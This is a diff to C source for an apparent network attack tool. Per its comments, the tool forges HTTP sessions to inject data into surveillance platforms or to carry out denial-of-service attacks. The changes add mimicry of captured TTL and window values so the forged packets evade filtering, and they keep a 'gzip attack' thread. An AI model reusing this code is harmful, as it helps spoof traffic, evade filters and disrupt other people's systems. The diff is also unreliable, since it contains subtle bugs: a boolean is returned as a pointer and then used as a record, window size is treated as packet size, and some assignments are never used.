@@ -42,11 +42,16 @@ char *strcasestr(char *haystack,  char *needle);
 // Fabricates a fake HTTP session to inject information directly into mass surveillance platforms
 // or help perform DoS attacks on their systems to disrupt their usages. This is the NEW HTTP function
 // which uses the modular building routines.
-int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,
+int BuildHTTP4Session(AS_context *ctx, AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,
     int client_size, char *server_body, int server_size) {
     PacketBuildInstructions *build_list = NULL;
     ConnectionProperties cptr;
     int ret = -1;
+    // get observed details (ttl/window/agent/server version) from live packet capture
+    // to use in generating sessions.. just makes it this much moree difficult to filter.
+    HTTPObservedVariables *OS_client = ObserveGet(ctx, 0);
+    HTTPObservedVariables *OS_server = ObserveGet(ctx, 1);
+
 
     // these are in headers.. and seems to be +1 fromm start..
     // we need to get more requests for when they begin to *attempt* to filter these out..
@@ -57,10 +62,9 @@ int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, 
     // os emulation and general statistics required here from operating systems, etc..
     //// find correct MTU, subtract headers.. calculate.
     // this is the max size of each packet while sending the bodies...
-    // !!! this has to calculate out the tcp/ip headers
     // 12 is for the options.. i have to let the attack structure know if options will be built for either client or server
-    int max_packet_size_client = 1500 - (20 * 2 + 12);
-    int max_packet_size_server = 1500 - (20 * 2 + 12); 
+    int max_packet_size_client = OS_client ? OS_client->window_size : (1500 - (20 * 2 + 12));
+    int max_packet_size_server = OS_server ? OS_server->window_size : (1500 - (20 * 2 + 12)); 
 
     int client_port = 1024 + (rand()%(65535-1024));
 
@@ -86,8 +90,8 @@ int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, 
     aptr->server_base_seq = server_seq;
     aptr->client_base_seq = client_seq;
 
-    cptr.client_ttl = 64;
-    cptr.server_ttl = 53;
+    cptr.client_ttl = OS_client ? OS_client->ttl : 64;
+    cptr.server_ttl = OS_server ? OS_server->ttl : 53;
 
     cptr.server_ip = server_ip;    
     cptr.client_ip = client_ip;
@@ -145,7 +149,7 @@ void *thread_gzip_attack(void *arg) {
     GZipAttack(ctx, aptr, &dptr->server_body_size, &dptr->server_body);
  
     // build session using the modified server body w gzip attacks
-    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, dptr->client_body, dptr->client_body_size, 
+    i = BuildHTTP4Session(ctx, aptr, aptr->dst, aptr->src, aptr->destination_port, dptr->client_body, dptr->client_body_size, 
         dptr->server_body, dptr->server_body_size);
             
     // free the details that were passed to us
@@ -264,7 +268,7 @@ void *HTTP4_Create(AS_attacks *aptr) {
     #endif
 
     // lets try new method    
-    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, ctx->G_client_body, ctx->G_client_body_size,
+    i = BuildHTTP4Session(ctx, aptr, aptr->dst, aptr->src, aptr->destination_port, ctx->G_client_body, ctx->G_client_body_size,
         ctx->G_server_body, ctx->G_server_body_size);
 
     #ifndef BIG_TEST
@@ -635,6 +639,8 @@ int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
     //sprintf(fname, "packets/raw_%d.dat", pcount++);
     //FileWrite(fname, iptr->packet, iptr->packet_size);
 
+    ObserveAdd(ctx, iptr->ttl, iptr->tcp_window_size);
+
     // if its not enabled.. just exit
     if (!ctx->http_discovery_enabled) return 0;
     
@@ -710,17 +716,7 @@ int HTTPDiscover_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
 // so that nobody has to keep things updated.. itll always transform itself with the current browwsers as long as
 // someone on the network uses it.. you can even just replay packets, and itll gather the data
 // this is for OS emulation
-HTTPObservedVariables *ObservedAdd(AS_context *ctx) {
-    HTTPObservedVariables *optr = NULL;
 
-    if ((optr = (HTTPObservedVariables *)calloc(1, sizeof(HTTPObservedVariables))) == NULL) return NULL;
-
-
-    optr->next = ctx->observed;
-    ctx->observed = optr;
-
-    return optr;
-}
 
 HTTPObservedVariables *ObserveGet(AS_context *ctx, int server) {
     HTTPObservedVariables *optr = NULL;
@@ -747,6 +743,36 @@ HTTPObservedVariables *ObserveGet(AS_context *ctx, int server) {
 
         optr = optr->next;
     }
+
+    return optr;
+}
+
+HTTPObservedVariables *ObserveCheck(AS_context *ctx, int ttl, int window_size) {
+    HTTPObservedVariables *optr = NULL;
+
+    optr = ctx->observed;
+    while (optr != NULL) {
+
+        if (optr->ttl == ttl && optr->window_size == window_size) break;
+
+        optr = optr->next;
+    }
+
+    return (optr != NULL);
+}
+
+HTTPObservedVariables *ObserveAdd(AS_context *ctx, int ttl, int window_size) {
+    HTTPObservedVariables *optr = NULL;
+
+    if ((optr = ObserveCheck(ctx, ttl, window_size)) != NULL) return optr;
+
+    if ((optr = (HTTPObservedVariables *)calloc(1, sizeof(HTTPObservedVariables))) == NULL) return NULL;
+
+    optr->ttl = ttl;
+    optr->window_size = window_size;
+    
+    optr->next = ctx->observed;
+    ctx->observed = optr;
 
     return optr;
 }
@@ -778,6 +804,12 @@ int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
     PacketBuildInstructions *iptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     ConnectionProperties cptr;
+
+    // get observed details (ttl/window/agent/server version) from live packet capture
+    // to use in generating sessions.. just makes it this much moree difficult to filter.
+    HTTPObservedVariables *OS_client = ObserveGet(ctx, 0);
+    HTTPObservedVariables *OS_server = ObserveGet(ctx, 1);
+
     
 
     // these are in headers.. and seems to be +1 fromm start..
@@ -791,8 +823,8 @@ int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
     // this is the max size of each packet while sending the bodies...
     // *** this has to calculate out the tcp/ip headers
     // 12 is for the options.. i have to let the attack structure know if options will be built for either client or server
-    int max_packet_size_client = 1500 - (20 * 2 + 12);
-    int max_packet_size_server = 1500 - (20 * 2 + 12); 
+    int max_packet_size_client = OS_client ? OS_client->window_size : (1500 - (20 * 2 + 12));
+    int max_packet_size_server = OS_server ? OS_server->window_size : (1500 - (20 * 2 + 12)); 
 
     int client_port = 1024 + (rand()%(65535-1024));
 
@@ -894,13 +926,25 @@ int HTTPDiscover_AnalyzeSession(AS_context *ctx, HTTPBuffer *hptr) {
 
     // if these are not set properly.. itll cause issues during low level packet building (TCPSend-ish api)
 
+    
     // lets grab ttl from the connection..
-    cptr.client_ttl = hptr->packet_list->ttl;
-    cptr.server_ttl = hptr->packet_list->next->ttl;
+    if ((rand()%100 < 50)) {
+        cptr.client_ttl = hptr->packet_list->ttl;
+        cptr.server_ttl = hptr->packet_list->next->ttl;
 
-    // double check these and get fromm connection
-    cptr.max_packet_size_client = max_packet_size_client;
-    cptr.max_packet_size_server = max_packet_size_server;
+        // double check these and get fromm connection
+        cptr.max_packet_size_client = max_packet_size_client;
+        cptr.max_packet_size_server = max_packet_size_server;
+
+    } else {
+        cptr.client_ttl = OS_client ? OS_client->ttl : 64;
+        cptr.server_ttl = OS_server ? OS_server->ttl : 53;
+
+        max_packet_size_client = OS_client ? OS_client->window_size : (1500 - (20 * 2 + 12));
+        max_packet_size_server = OS_server ? OS_server->window_size : (1500 - (20 * 2 + 12)); 
+
+    }
+
 
     IP_prepare(new_source_ip, &cptr.client_ip, &cptr.client_ipv6, &is_src_ipv6);
     IP_prepare(new_destination_ip, &cptr.server_ip, &cptr.server_ipv6, &is_dest_ipv6);
